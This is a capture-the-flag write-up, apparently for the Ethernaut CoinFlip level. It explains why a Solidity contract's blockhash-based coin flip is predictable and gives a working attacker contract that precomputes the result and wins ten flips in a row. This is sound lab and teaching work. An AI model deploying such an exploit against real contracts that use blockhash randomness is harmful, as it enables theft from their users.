This contract uses a pseudo-random number generator to flip a coin. The goal of the challenge is to guess the coinflip correctly 10 times in a row. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

Looking over the code we can see how the coin flip is done. Looking over the code it can be predicted since the RNG machine is predictable as it uses the hash from the last block and a saved factor. The easiest way to attack this contract is to write one of our own. Navigating to [https://remix.ethereum.org/](https://remix.ethereum.org/) we can write and deploy a contract that can attack this one. 

The attack is fairly simple. We first write a contract that does the coinflip in the same way. Then based on the result interacts with the vulnerable contract and sends the result for us. All we have to do is call the cheat function. 

Here is the contract to exploit it with the description below.

```solidity
pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract dirtyRat {
    CoinFlip public flipper;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool public side;
    
    constructor() public {
        flipper = CoinFlip(0x72806B20265F51BC83D5cb65d7289FBDCB513eFc);
    }
    
    function cheat() public returns(bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        side = coinFlip == 1 ? true : false;
        bool result = flipper.flip(side);
        return true;
    }
}
```

The first thing we have to do is copy the CoinFlip contract code over. Since our contract is going to be communicating with the contract it needs to know what it looks like. Also at the top is the import for the code that the contract uses. In order to get the contract to compile we have to give it a direct link to the file that we want to import. 

After copying the code over we start creating our contract that will interact with the vulnerable one. This is the dirtyRat contract at the bottom. In this contract we initialize some variables that our contract will need in order to be able to run the same calculations. Then in the constructor we create a variable that points to the CoinFlip contract that we are attacking. We can get the address by typing in ```instance``` in the console of chrome. 

There is a cheat function that has to be created. This function will do the same calculations to flip the coin. Then after learning the output will call the other contract's flip function with the correct side. 

Once the code is created we need to deploy it using the remix site. Make sure that we deploy the dirtyRat contract on the site. Once the code is deployed the remix site will give us easy access to call the cheat function. 

![](attach/Pasted%20image%2020210822202601.png)

All we have to do is run the cheat function 10 times. We can check the to make sure it is working by running ```await contract.consecutiveWins()```. 

![](attach/Pasted%20image%2020210822202715.png)

We can see in the output that the words array that we have won 10 times in a row. At this point we can turn in the contract.
